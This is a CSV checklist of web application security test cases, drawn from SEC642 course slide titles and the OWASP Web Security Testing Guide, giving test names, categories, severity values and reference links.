TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
S642-5.1.4.764,SEC642,18. Review: Fingerprinting Controls,,,,,,,,5.1.4: Bypassing Controls,764,,,,,,sec642/43385/index.htm#18,,,,
S642-5.1.4.765,SEC642,19. Course Roadmap,,,,,,,,5.1.4: Bypassing Controls,765,,,,,,sec642/43385/index.htm#19,,,,
S642-5.1.4.766,SEC642,20. Automated WAF Detection Tools,,,,,,,,5.1.4: Bypassing Controls,766,,,true,,,sec642/43385/index.htm#20,,,,
S642-5.1.4.767,SEC642,21. Nmap NSE Script,,,,,,,,5.1.4: Bypassing Controls,767,,,true,,,sec642/43385/index.htm#21,,,,
S642-5.1.4.768,SEC642,22. Automated Scanners,,,,,,,,5.1.4: Bypassing Controls,768,,,true,,,sec642/43385/index.htm#22,,,,
S642-5.1.4.755,SEC642,9. Character Sets,,,,,,,,5.1.4: Bypassing Controls,755,,,true,,,sec642/43385/index.htm#9,,,,
S642-5.1.4.754,SEC642,8. Fuzzing,,,,,,,,5.1.4: Bypassing Controls,754,,,true,,,sec642/43385/index.htm#8,,,,
S642-5.1.4.770,SEC642,24. Course Roadmap,,,,,,,,5.1.4: Bypassing Controls,770,,,,,,sec642/43385/index.htm#24,,,,
S642-5.1.4.771,SEC642,25. Exercise: Automated WAF Detection,,,,,,,,5.1.4: Bypassing Controls,771,,,,,,sec642/43385/index.htm#25,,,,
S642-5.1.4.772,SEC642,26. Answers Ahead!,,,,,,,,5.1.4: Bypassing Controls,772,,,,,,sec642/43385/index.htm#26,,,,
S642-5.1.4.749,SEC642,3. Bypass Based on Protection,,,,,,,,5.1.4: Bypassing Controls,749,,,true,,,sec642/43385/index.htm#3,,,,
S642-5.1.4.775,SEC642,29. Automated WAF Detection Exercise: Run wafw00f,,,,,,,,5.1.4: Bypassing Controls,775,,,,,,sec642/43385/index.htm#29,,,,
S642-5.1.5.776,SEC642,30. Review: Automated Fingerprinting Tools,,,,,,,,5.1.4: Bypassing Controls,776,,,,,,sec642/43385/index.htm#30,,,,
S642-5.1.5.777,SEC642,5.1.5: Cross-Site Scripting,,,,,,,,5.1.5: Cross-Site Scripting,777,,,false,,,sec642/43390/index.htm,,,,
S642-5.1.5.778,SEC642,2. XSS is Client-focused,,,,,,,,5.1.5: Cross-Site Scripting,778,,,false,,,sec642/43390/index.htm#2,,,,
S642-5.1.5.779,SEC642,3. Abuse the Misunderstandings,,,,,,,,5.1.5: Cross-Site Scripting,779,,,false,,,sec642/43390/index.htm#3,,,,
S642-5.1.4.773,SEC642,27. Automated WAF Detection Exercise: Run NMAP and NSE Scripts,,,,,,,,5.1.4: Bypassing Controls,773,,,,,,sec642/43385/index.htm#27,,,,
WSTG-01.01,OWASP-WSTG,Conduct Search Engine Discovery Reconnaissance for Information Leakage,Information_Gathering,Conduct Search Engine Discovery Reconnaissance for Information Leakage,Conduct Search Engine Discovery Reconnaissance for Information Leakage issue,Conduct Search Engine Discovery Reconnaissance for Information Leakage,2,Click TTRef link.,Discovery,Information_Gathering,01.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md,,false,false,false
WSTG-01.02,OWASP-WSTG,Fingerprint Web Server,Information_Gathering,Fingerprint Web Server,Fingerprint Web Server issue,Fingerprint Web Server,2,Click TTRef link.,Discovery,Information_Gathering,01.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md,,false,false,false
WSTG-01.03,OWASP-WSTG,Review Webserver Metafiles for Information Leakage,Information_Gathering,Review Webserver Metafiles for Information Leakage,Review Webserver Metafiles for Information Leakage issue,Review Webserver Metafiles for Information Leakage,2,Click TTRef link.,Discovery,Information_Gathering,01.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md,,false,false,false
WSTG-01.04,OWASP-WSTG,Enumerate Applications on Webserver,Information_Gathering,Enumerate Applications on Webserver,Enumerate Applications on Webserver issue,Enumerate Applications on Webserver,2,Click TTRef link.,Discovery,Information_Gathering,01.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md,,false,false,false
WSTG-01.05,OWASP-WSTG,Review Webpage Content for Information Leakage,Information_Gathering,Review Webpage Content for Information Leakage,Review Webpage Content for Information Leakage issue,Review Webpage Content for Information Leakage,2,Click TTRef link.,Discovery,Information_Gathering,01.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage.md,,false,false,false
WSTG-01.06,OWASP-WSTG,Identify Application Entry Points,Information_Gathering,Identify Application Entry Points,Identify Application Entry Points issue,Identify Application Entry Points,2,Click TTRef link.,Discovery,Information_Gathering,01.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md,,false,false,false
WSTG-01.07,OWASP-WSTG,Map Execution Paths Through Application,Information_Gathering,Map Execution Paths Through Application,Map Execution Paths Through Application issue,Map Execution Paths Through Application,2,Click TTRef link.,Discovery,Information_Gathering,01.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application.md,,false,false,false
WSTG-01.08,OWASP-WSTG,Fingerprint Web Application Framework,Information_Gathering,Fingerprint Web Application Framework,Fingerprint Web Application Framework issue,Fingerprint Web Application Framework,2,Click TTRef link.,Discovery,Information_Gathering,01.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md,,false,false,false
WSTG-01.09,OWASP-WSTG,Fingerprint Web Application,Information_Gathering,Fingerprint Web Application,Fingerprint Web Application issue,Fingerprint Web Application,2,Click TTRef link.,Discovery,Information_Gathering,01.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application.md,,false,false,false
WSTG-01.10,OWASP-WSTG,Map Application Architecture,Information_Gathering,Map Application Architecture,Map Application Architecture issue,Map Application Architecture,2,Click TTRef link.,Discovery,Information_Gathering,01.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md,,false,false,false
WSTG-02.01,OWASP-WSTG,Test Network Infrastructure Configuration,Configuration_and_Deployment_Management_Testing,Test Network Infrastructure Configuration,Test Network Infrastructure Configuration issue,Test Network Infrastructure Configuration,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration.md,,false,false,false
WSTG-02.02,OWASP-WSTG,Test Application Platform Configuration,Configuration_and_Deployment_Management_Testing,Test Application Platform Configuration,Test Application Platform Configuration issue,Test Application Platform Configuration,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration.md,,false,false,false
WSTG-02.03,OWASP-WSTG,Test File Extensions Handling for Sensitive Information,Configuration_and_Deployment_Management_Testing,Test File Extensions Handling for Sensitive Information,Test File Extensions Handling for Sensitive Information issue,Test File Extensions Handling for Sensitive Information,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md,,false,false,false
WSTG-02.04,OWASP-WSTG,Review Old Backup and Unreferenced Files for Sensitive Information,Configuration_and_Deployment_Management_Testing,Review Old Backup and Unreferenced Files for Sensitive Information,Review Old Backup and Unreferenced Files for Sensitive Information issue,Review Old Backup and Unreferenced Files for Sensitive Information,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md,,false,false,false
WSTG-02.05,OWASP-WSTG,Enumerate Infrastructure and Application Admin Interfaces,Configuration_and_Deployment_Management_Testing,Enumerate Infrastructure and Application Admin Interfaces,Enumerate Infrastructure and Application Admin Interfaces issue,Enumerate Infrastructure and Application Admin Interfaces,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md,,false,false,false
WSTG-02.06,OWASP-WSTG,Test HTTP Methods,Configuration_and_Deployment_Management_Testing,Test HTTP Methods,Test HTTP Methods issue,Test HTTP Methods,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md,,false,false,false
WSTG-02.07,OWASP-WSTG,Test HTTP Strict Transport Security,Configuration_and_Deployment_Management_Testing,Test HTTP Strict Transport Security,Test HTTP Strict Transport Security issue,Test HTTP Strict Transport Security,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.md,,false,false,false
WSTG-02.08,OWASP-WSTG,Test RIA Cross Domain Policy,Configuration_and_Deployment_Management_Testing,Test RIA Cross Domain Policy,Test RIA Cross Domain Policy issue,Test RIA Cross Domain Policy,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy.md,,false,false,false
WSTG-02.09,OWASP-WSTG,Test File Permission,Configuration_and_Deployment_Management_Testing,Test File Permission,Test File Permission issue,Test File Permission,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission.md,,false,false,false
WSTG-02.10,OWASP-WSTG,Test for Subdomain Takeover,Configuration_and_Deployment_Management_Testing,Test for Subdomain Takeover,Test for Subdomain Takeover issue,Test for Subdomain Takeover,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md,,false,false,false
WSTG-02.11,OWASP-WSTG,Test Cloud Storage,Configuration_and_Deployment_Management_Testing,Test Cloud Storage,Test Cloud Storage issue,Test Cloud Storage,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.11,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md,,false,false,false
WSTG-03.01,OWASP-WSTG,Test Role Definitions,Identity_Management_Testing,Test Role Definitions,Test Role Definitions issue,Test Role Definitions,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions.md,,false,false,false
WSTG-03.02,OWASP-WSTG,Test User Registration Process,Identity_Management_Testing,Test User Registration Process,Test User Registration Process issue,Test User Registration Process,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process.md,,false,false,false
WSTG-03.03,OWASP-WSTG,Test Account Provisioning Process,Identity_Management_Testing,Test Account Provisioning Process,Test Account Provisioning Process issue,Test Account Provisioning Process,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process.md,,false,false,false
WSTG-03.04,OWASP-WSTG,Testing for Account Enumeration and Guessable User Account,Identity_Management_Testing,Account Enumeration and Guessable User Account,Account Enumeration and Guessable User Account issue,Account Enumeration and Guessable User Account,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md,,false,false,false
WSTG-03.05,OWASP-WSTG,Testing for Weak or Unenforced Username Policy,Identity_Management_Testing,Weak or Unenforced Username Policy,Weak or Unenforced Username Policy issue,Weak or Unenforced Username Policy,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy.md,,false,false,false
WSTG-04.02,OWASP-WSTG,Testing for Default Credentials,Authentication_Testing,Default Credentials,Default Credentials issue,Default Credentials,2,Click TTRef link.,Discovery,Authentication_Testing,04.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials.md,,false,false,false
WSTG-04.05,OWASP-WSTG,Testing for Vulnerable Remember Password,Authentication_Testing,Vulnerable Remember Password,Vulnerable Remember Password issue,Vulnerable Remember Password,2,Click TTRef link.,Discovery,Authentication_Testing,04.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password.md,,false,false,false
WSTG-04.06,OWASP-WSTG,Testing for Browser Cache Weaknesses,Authentication_Testing,Browser Cache Weaknesses,Browser Cache Weaknesses issue,Browser Cache Weaknesses,2,Click TTRef link.,Discovery,Authentication_Testing,04.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md,,false,false,false
WSTG-04.07,OWASP-WSTG,Testing for Weak Password Policy,Authentication_Testing,Weak Password Policy,Weak Password Policy issue,Weak Password Policy,2,Click TTRef link.,Discovery,Authentication_Testing,04.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy.md,,false,false,false
WSTG-04.01,OWASP-WSTG,Testing for Credentials Transported over an Encrypted Channel,Authentication_Testing,Credentials Transported over an Encrypted Channel,Credentials Transported over an Encrypted Channel issue,Credentials Transported over an Encrypted Channel,2,Click TTRef link.,Discovery,Authentication_Testing,04.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md,,false,false,false
WSTG-04.04,OWASP-WSTG,Testing for Bypassing Authentication Schema,Authentication_Testing,Bypassing Authentication Schema,Bypassing Authentication Schema issue,Bypassing Authentication Schema,2,Click TTRef link.,Discovery,Authentication_Testing,04.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md,,false,false,false
WSTG-04.03,OWASP-WSTG,Testing for Weak Lock Out Mechanism,Authentication_Testing,Weak Lock Out Mechanism,Weak Lock Out Mechanism issue,Weak Lock Out Mechanism,2,Click TTRef link.,Discovery,Authentication_Testing,04.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md,,false,false,false
WSTG-04.08,OWASP-WSTG,Testing for Weak Security Question Answer,Authentication_Testing,Weak Security Question Answer,Weak Security Question Answer issue,Weak Security Question Answer,2,Click TTRef link.,Discovery,Authentication_Testing,04.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer.md,,false,false,false
WSTG-04.09,OWASP-WSTG,Testing for Weak Password Change or Reset Functionalities,Authentication_Testing,Weak Password Change or Reset Functionalities,Weak Password Change or Reset Functionalities issue,Weak Password Change or Reset Functionalities,2,Click TTRef link.,Discovery,Authentication_Testing,04.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md,,false,false,false
WSTG-04.10,OWASP-WSTG,Testing for Weaker Authentication in Alternative Channel,Authentication_Testing,Weaker Authentication in Alternative Channel,Weaker Authentication in Alternative Channel issue,Weaker Authentication in Alternative Channel,2,Click TTRef link.,Discovery,Authentication_Testing,04.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md,,false,false,false
WSTG-05.01,OWASP-WSTG,Testing Directory Traversal File Include,Authorization_Testing,Testing Directory Traversal File Include,Testing Directory Traversal File Include issue,Testing Directory Traversal File Include,2,Click TTRef link.,Discovery,Authorization_Testing,05.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md,,false,false,false
WSTG-05.02,OWASP-WSTG,Testing for Bypassing Authorization Schema,Authorization_Testing,Bypassing Authorization Schema,Bypassing Authorization Schema issue,Bypassing Authorization Schema,2,Click TTRef link.,Discovery,Authorization_Testing,05.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md,,false,false,false
WSTG-05.04,OWASP-WSTG,Testing for Insecure Direct Object References,Authorization_Testing,Insecure Direct Object References,Insecure Direct Object References issue,Insecure Direct Object References,2,Click TTRef link.,Discovery,Authorization_Testing,05.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md,,false,false,false
WSTG-05.03,OWASP-WSTG,Testing for Privilege Escalation,Authorization_Testing,Privilege Escalation,Privilege Escalation issue,Privilege Escalation,2,Click TTRef link.,Discovery,Authorization_Testing,05.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md,,false,false,false
WSTG-06.01,OWASP-WSTG,Testing for Session Management Schema,Session_Management_Testing,Session Management Schema,Session Management Schema issue,Session Management Schema,2,Click TTRef link.,Discovery,Session_Management_Testing,06.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md,,false,false,false
